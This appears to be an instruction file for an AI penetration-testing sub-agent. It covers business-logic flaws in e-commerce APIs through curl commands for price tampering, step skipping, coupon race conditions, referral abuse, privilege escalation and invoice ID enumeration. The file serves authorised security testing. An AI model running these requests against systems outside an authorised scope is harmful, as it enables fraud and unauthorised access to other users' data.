# Testing for business-logic vulnerabilities

> OSS port of mukul975's `testing-for-business-logic-vulnerabilities`. All curl one-liners from the original stay verbatim — they were already OSS. Burp Turbo Intruder / Sequencer / Postman swap to concurrent curl / `httpracer` / `ent` / Hoppscotch.

## Sub-agent mission

You are dispatched to find business-logic flaws that scanners miss: price/quantity manipulation, workflow step bypass, race conditions, referral/reward abuse, role/permission logic errors. You map the business workflow, generate curl test cases, run them, and analyze the results. Report findings with severity, evidence, the violated business rule, and the matching defensive plugin.

## Inputs

- **task:** the user's verbatim request (e.g. "we have an e-commerce checkout — test if I can manipulate the price").
- **target / scope:** base URL + in-scope business flows. Confirmed by the orchestrator's gate.
- **ack_state:** `confirmed` for live-target; `n/a` for static review of the business-rule code.
- **context (required):** documented business workflow (steps, inputs, expected transitions). Without this, the first step is to elicit it.

## Tools

```bash
# Install (documentation only)
brew install mitmproxy                    # interactive proxy (replaces Burp Suite)
brew install ent                          # token randomness analysis (replaces Burp Sequencer)
# Hoppscotch / bruno (OSS) replace Postman — both have collection runners
# httpracer for true HTTP/2 single-packet races:
go install github.com/juxhumbug/httpracer@latest 2>/dev/null || true
```

For the paid→OSS swap table, `SEE: references/oss-tool-map.md`.

## Methodology

### Step 1 — Map business workflows

Before testing, document the workflow. If the user has not provided it, ask:

1. **Steps** the user takes to accomplish the goal (browse → add-to-cart → checkout → pay → confirm).
2. **Inputs** at each step (quantities, prices, coupon codes, user roles).
3. **Transitions** between steps (what state must hold for step N+1 to be valid?).
4. **Trust boundaries** (what does the client send vs. what the server re-derives?).

Capture the map as a numbered list. This becomes the test-case generation surface.

### Step 2 — Test price / quantity manipulation

The most common business-logic flaw: the client sends the price/quantity and the server trusts it.

```bash
# Original request (legit)
curl -sk -X POST https://TARGET/api/cart/add \
     -H "Content-Type: application/json" \
     -H "Cookie: session=$SESSION" \
     --data '{"sku":"WIDGET-1","price":19.99,"qty":1}'

# Tampered — negative price
curl -sk -X POST https://TARGET/api/cart/add \
     -H "Content-Type: application/json" \
     -H "Cookie: session=$SESSION" \
     --data '{"sku":"WIDGET-1","price":-19.99,"qty":1}'

# Tampered — negative quantity (some carts compute total = price*qty and refund)
curl -sk -X POST https://TARGET/api/cart/add \
     -H "Content-Type: application/json" \
     -H "Cookie: session=$SESSION" \
     --data '{"sku":"WIDGET-1","price":19.99,"qty":-5}'

# Tampered — fractional quantity (rounding tricks)
curl -sk -X POST https://TARGET/api/cart/add \
     -H "Content-Type: application/json" \
     -H "Cookie: session=$SESSION" \
     --data '{"sku":"WIDGET-1","price":19.99,"qty":0.5}'

# Tampered — very large quantity (integer overflow)
curl -sk -X POST https://TARGET/api/cart/add \
     -H "Content-Type: application/json" \
     -H "Cookie: session=$SESSION" \
     --data '{"sku":"WIDGET-1","price":19.99,"qty":2147483647}'
```

**Server-re-derive rule:** the correct pattern is for the server to look up the price by SKU and ignore any client-supplied price. A finding is any case where the client-supplied value is honored.

### Step 3 — Test workflow step bypass

Try skipping steps. The server should reject transitions that skip required state.

```bash
# Legit: 1) add → 2) address → 3) payment → 4) confirm
# Skip directly to confirm
curl -sk -X POST https://TARGET/api/checkout/confirm \
     -H "Cookie: session=$SESSION" \
     --data '{}'

# Skip payment step
curl -sk -X POST https://TARGET/api/checkout/place-order \
     -H "Cookie: session=$SESSION" \
     --data '{"skip_payment":true}'

# Replay a step (double-apply a coupon)
curl -sk -X POST https://TARGET/api/cart/apply-coupon \
     -H "Cookie: session=$SESSION" \
     --data '{"code":"WELCOME10"}'
curl -sk -X POST https://TARGET/api/cart/apply-coupon \
     -H "Cookie: session=$SESSION" \
     --data '{"code":"WELCOME10"}'
```

### Step 4 — Test race conditions

> OSS replacement for "Send to Burp Turbo Intruder". Use the bash `&`+`wait` pattern for best-effort concurrent requests, or `httpracer` for true HTTP/2 single-packet races.

```bash
# Best-effort concurrent race (bash background jobs)
URL="https://TARGET/api/coupon/redeem"
PAYLOAD='{"code":"ONE_TIME_ONLY"}'
for i in {1..30}; do
  curl -sk -X POST "$URL" \
       -H "Content-Type: application/json" \
       -H "Cookie: session=$SESSION" \
       --data "$PAYLOAD" \
       -o "race-$i.out" &
done
wait

# Count successes (a single-use coupon that redeems >1 times is a finding)
grep -l "success" race-*.out | wc -l
rm -f race-*.out
```

For true sub-millisecond single-packet races, use `httpracer` (Go):

```bash
httpracer -u https://TARGET/api/coupon/redeem \
          -H "Cookie: session=$SESSION" \
          -d '{"code":"ONE_TIME_ONLY"}' \
          -n 30
```

**Gap:** curl background jobs are best-effort; true HTTP/2 single-packet races need `httpracer`. `SEE: references/oss-tool-map.md` for the parity gap statement.

### Step 5 — Test referral / reward abuse

```bash
# Self-referral (same user, multiple accounts)
curl -sk -X POST https://TARGET/api/referral/apply \
     -H "Cookie: session=$SESSION" \
     --data '{"referral_code":"MY_OWN_CODE"}'

# Referral replay
for i in {1..10}; do
  curl -sk -X POST https://TARGET/api/referral/apply \
       -H "Cookie: session=$SESSION$i" \
       --data '{"referral_code":"SAME_CODE"}' &
done
wait

# Reward stacking where forbidden
curl -sk -X POST https://TARGET/api/rewards/redeem \
     -H "Cookie: session=$SESSION" \
     --data '{"reward_ids":["R1","R2","R3"]}'
```

### Step 6 — Test role / permission logic (privilege escalation)

```bash
# Horizontal privilege escalation (access another user's resource)
curl -sk https://TARGET/api/orders/12345 \
     -H "Cookie: session=$USER_A_SESSION"   # try IDs belonging to user B

# Vertical privilege escalation (regular user calls admin endpoint)
curl -sk -X POST https://TARGET/admin/users/delete \
     -H "Cookie: session=$REGULAR_USER_SESSION" \
     --data '{"user_id":"someone_else"}'

# IDOR via predictable identifiers
for id in {1..100}; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
       -H "Cookie: session=$SESSION" \
       "https://TARGET/api/invoices/$id")
  [ "$code" = "200" ] && echo "ACCESSIBLE: invoice $id"
done
```

### Token randomness analysis (replaces Burp Sequencer)

If the workflow issues tokens (CSRF, session, reset), gather a sample and analyze with `ent`:

```bash
# Collect 1000 tokens
for i in {1..1000}; do
  curl -sk https://TARGET/auth/fresh-token | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])"
done > tokens.txt

# Analyze
ent tokens.txt
# Look for: entropy < 7 bits/byte, chi-square distribution p < 0.01 = non-random
```

**Gap:** `ent` is basic coverage. Burp Sequencer's compression/spectral analyses are richer. `SEE: references/oss-tool-map.md`.

## Common mistakes

- **Testing without a workflow map.** Business-logic flaws are workflow-specific. Skipping Step 1 guarantees missing the actual bug.
- **Reporting client-side tampering that the server already rejects.** Always confirm with the server's response (order total, status code, DB state).
- **Underestimating race windows.** 30 concurrent curl jobs may not be enough; some race windows are microseconds. Document the attempt and recommend `httpracer` for true sub-ms races.
- **Testing only the happy path's inverse.** Also test partial states (step 2.5 of 4), replayed steps, and out-of-order steps.
- **Ignoring IDOR.** Predictable identifiers (`/api/orders/12345`) are the most common business-logic finding. Always enumerate.

## Quick reference — business-logic vuln classes

| Class | Test | OWASP |
|---|---|---|
| Price/quantity manipulation | Negative price, negative qty, fractional qty, overflow | A04:2021 |
| Workflow bypass | Skip step, replay step, out-of-order | A01:2021, A04:2021 |
| Race condition | Concurrent redeem of single-use resource | A04:2021, A08:2021 |
| Referral / reward abuse | Self-referral, replay, stacking | A04:2021 |
| Privilege escalation | Horizontal (other user), vertical (admin as regular) | A01:2021 |
| IDOR | Predictable identifiers enumeration | A01:2021 |

## OWASP / MITRE references

- **OWASP A04:2021** — Insecure Design.
- **OWASP A01:2021** — Broken Access Control.
- **OWASP A08:2021** — Software and Data Integrity Failures (race conditions).
- **MITRE ATT&CK** — T1190 (Exploit Public-Facing Application), T1059.007 (JavaScript), T1505.003 (Web Shell), T1083, T1068 (Exploitation for Privilege Escalation).

## Standardized finding output template

```text
Vulnerability: <one-line name>
Severity:      critical | high | medium | low
CVSS:          <vector or score if computable>
OWASP:         A0X:2021
MITRE:         TXXXX
Business rules violated:
  - <rule 1>
  - <rule 2>
Evidence:      <curl command + observed response>
Remediation:   <server-side fix>
Defensive plugin: <name in this repo>
```

## Remediation

`SEE: references/defensive-cross-refs.md`. Typical matches:

- Workflow bypass / broken access control → `defense-in-depth-validation` (server-side state machine + re-derivation).
- Privilege escalation → `defense-in-depth-validation` + framework-native authorization.

## Sub-agent return contract

```json
{
  "findings": [
    {
      "vuln": "Price manipulation: server honors client-supplied price in /api/cart/add",
      "severity": "high",
      "cvss": "AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (6.5 Medium)",
      "owasp": "A04:2021",
      "mitre": ["T1190"],
      "business_rules_violated": ["Server must look up price by SKU, not trust client-supplied price"],
      "evidence": "POST /api/cart/add with price:-19.99 produced a cart total of -19.99 (order would refund the buyer).",
      "remediation": "Ignore client-supplied price; look up by SKU on the server.",
      "defensive_plugin": "defense-in-depth-validation"
    }
  ],
  "workflow_mapped": ["browse", "add-to-cart", "checkout-address", "checkout-payment", "confirm"],
  "summary": "1 high-severity price-manipulation finding; workflow mapped across 5 steps."
}
```
